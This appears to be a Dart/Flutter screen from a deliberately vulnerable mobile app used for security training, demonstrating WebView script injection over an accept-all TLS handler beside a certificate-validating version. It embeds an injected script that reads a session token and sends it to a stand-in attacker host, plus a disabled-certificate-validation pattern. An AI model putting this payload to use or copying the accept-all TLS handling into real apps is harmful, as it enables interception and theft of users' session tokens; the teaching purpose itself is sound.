import 'package:flutter/material.dart';
import 'package:webview_flutter/webview_flutter.dart';

import '../../../core/evidence_sink.dart';
import '../../../core/theme/dvma_colors.dart';
import '../../../core/vuln_demo_scaffold.dart';
import '../../../core/webview_demo_host.dart';
import 'webview_loader.dart';

/// WebView JS Injection + SSL-Validation Bypass.
///
/// A WebView loads page content over an accept-all TLS transport (certificate
/// validation disabled) while permitting script injection, so a MITM presents
/// a forged cert, rewrites the page to inject `<script>`, and exfiltrates the
/// session token (PayRange CVE-2026-13461 class).
class WebviewJsInjectionSslBypassScreen extends StatefulWidget {
  const WebviewJsInjectionSslBypassScreen({super.key});

  static const String vulnId = 'webview_js_injection_ssl_bypass';

  @override
  State<WebviewJsInjectionSslBypassScreen> createState() =>
      _WebviewJsInjectionSslBypassScreenState();
}

class _WebviewJsInjectionSslBypassScreenState
    extends State<WebviewJsInjectionSslBypassScreen> {
  String? _vulnResult;
  String? _secureResult;

  WebViewController? _controller;
  String? _liveResult;
  String? _tlsVulnResult;
  String? _tlsSecureResult;

  @override
  void initState() {
    super.initState();
    if (!supportsRealWebView) return;
    _bootRealWebView();
  }

  /// Boots a real WebView that loads the MITM-REWRITTEN page the accept-all TLS
  /// handler let through. The page holds an injected <script> that reads the
  /// in-page bridge token and beacons it, here the beacon is captured through
  /// a `Beacon` JS channel, proving the injected script executed and
  /// exfiltrated the token inside a real WebView.
  Future<void> _bootRealWebView() async {
    try {
      final controller = WebViewController()
        ..setJavaScriptMode(JavaScriptMode.unrestricted)
        ..addJavaScriptChannel(
          'Beacon',
          onMessageReceived: (JavaScriptMessage m) {
            DvmaEvidence.record(
              WebviewJsInjectionSslBypassScreen.vulnId,
              'webview-mitm-injection',
              'accept-all TLS loaded MITM page; injected <script> read '
                  'window.bridge.getToken() and beaconed it -> ${m.message}',
            );
            if (!mounted) return;
            setState(
              () => _liveResult =
                  'injected MITM script exfiltrated: ${m.message}',
            );
          },
        );
      // Provide the in-page bridge the injected MITM script calls, then load
      // the attacker-rewritten HTML (Transport.mitmHtml) whose <script> reads
      // the token. Its fetch() to the attacker host is redirected to Beacon.
      await controller.loadHtmlString(
        '<html><head><script>'
        'window.bridge={getToken:function(){'
        'return Promise.resolve(${_jsString(WebViewLoader.sessionToken)})}};'
        'window.fetch=function(u){Beacon.postMessage(u);'
        'return Promise.resolve({})};'
        '</script></head><body>${_injectedBody()}</body></html>',
      );
      if (!mounted) return;
      setState(() => _controller = controller);
    } catch (_) {
      // Best effort; helper contrast panels still demonstrate the flaw.
    }
  }

  /// The attacker-injected script body (as delivered over accept-all TLS).
  static String _injectedBody() =>
      'PayRange balance: \$12.40'
      '<script>window.bridge.getToken().then(function(t){'
      'fetch("https://mitm.evil.example/x?t="+t)});</script>';

  /// Quote a Dart string as a JS string literal.
  static String _jsString(String s) =>
      '"${s.replaceAll(r'\', r'\\').replaceAll('"', r'\"')}"';

  String _render(WebViewLoadOutcome r) {
    final b = StringBuffer();
    b.writeln('host                 : ${WebViewLoader.host}');
    b.writeln('loaded               : ${r.loaded}');
    b.writeln('blocked              : ${r.blocked}');
    if (r.blockReason != null) {
      b.writeln('block reason         : ${r.blockReason}');
    }
    b.writeln('injected script ran  : ${r.injectedScriptExecuted}');
    b.writeln('exfiltrated token    : ${r.exfiltratedToken ?? '(none)'}');
    b.writeln('token stolen (MITM)  : ${r.tokenStolen}');
    return b.toString().trimRight();
  }

  void _run() {
    const loader = WebViewLoader();

    // VULN: accept-all TLS transport loads the MITM-rewritten page and its
    // injected script exfiltrates the token.
    final vuln = loader.load();

    // SECURE: cert-validating transport rejects the forged MITM cert; nothing
    // loads and no script runs.
    final secure = loader.loadSafe();

    setState(() {
      _vulnResult = _render(vuln);
      _secureResult = _render(secure);
    });

    // real TLS: exercise a genuine dart:io HTTPS handshake both ways. The
    // accept-all client trusts an untrusted/self-signed cert (MITM succeeds);
    // the validated client rejects the same cert. Best-effort over the network.
    _runRealTls();
  }

  /// Performs the real HTTPS handshakes off the UI path and records the
  /// device-observable outcome. A self-signed test endpoint is accepted by the
  /// accept-all client and rejected by the validating one.
  Future<void> _runRealTls() async {
    const transport = RealTlsTransport();
    // A stable self-signed endpoint: default validation must reject it, an
    // accept-all handler accepts it, the exact MITM-cert distinction.
    const forgedCertUrl = 'https://self-signed.badssl.com/';
    final vulnTls = await transport.fetchAcceptAll(forgedCertUrl);
    final secureTls = await transport.fetchValidated(forgedCertUrl);
    await DvmaEvidence.record(
      WebviewJsInjectionSslBypassScreen.vulnId,
      'real-tls-accept-all',
      'accept-all: $vulnTls\nvalidated: $secureTls',
    );
    if (!mounted) return;
    setState(() {
      _tlsVulnResult = vulnTls;
      _tlsSecureResult = secureTls;
    });
  }

  @override
  Widget build(BuildContext context) {
    return VulnDemoScaffold(
      vulnId: WebviewJsInjectionSslBypassScreen.vulnId,
      title: 'WebView JS Injection + SSL-Validation Bypass',
      difficulty: DvmaDifficulty.hard,
      explanation:
          'A WebView loads page content over a transport whose TLS certificate '
          'validation is disabled (an accept-all handler - Android '
          'onReceivedSslError -> handler.proceed(); iOS URLSession credential '
          'trust) while also permitting script injection. A MITM attacker on '
          'the path presents a FORGED certificate; the accept-all handler '
          'proceeds anyway, so the attacker\'s rewritten page loads and its '
          'injected <script> calls window.bridge.getToken() and beacons the '
          'session token to the attacker (PayRange CVE-2026-13461 class). This '
          'demo boots a REAL WebView that runs the injected MITM script and '
          'exfiltrates the token over a JS channel, and performs a REAL dart:io '
          'HTTPS handshake: the accept-all client trusts a self-signed/forged '
          'cert while the validating client rejects it (in-memory panels are '
          'the offline contrast). The secure path validates the certificate '
          'against the trusted roots, so the forged cert fails and no content '
          'ever loads.',
      children: [
        DemoActionButton(
          label: 'Load page over accept-all TLS (MITM on path)',
          onPressed: _run,
        ),
        if (_vulnResult != null)
          EvidencePanel(
            label: 'WebView load (accept-all cert handler)',
            value: _vulnResult!,
          ),
        if (_secureResult != null)
          EvidencePanel(
            label: 'validated: certificate verification enforced',
            value: _secureResult!,
          ),
        if (_tlsVulnResult != null)
          EvidencePanel(
            label: 'REAL TLS: accept-all handshake (forged cert accepted)',
            value: _tlsVulnResult!,
          ),
        if (_tlsSecureResult != null)
          EvidencePanel(
            label: 'REAL TLS: validated handshake (forged cert rejected)',
            value: _tlsSecureResult!,
          ),
        if (_liveResult != null)
          EvidencePanel(
            label: 'REAL webview: injected MITM script ran + exfiltrated',
            value: _liveResult!,
          ),
        RealWebViewView(controller: _controller),
      ],
    );
  }
}
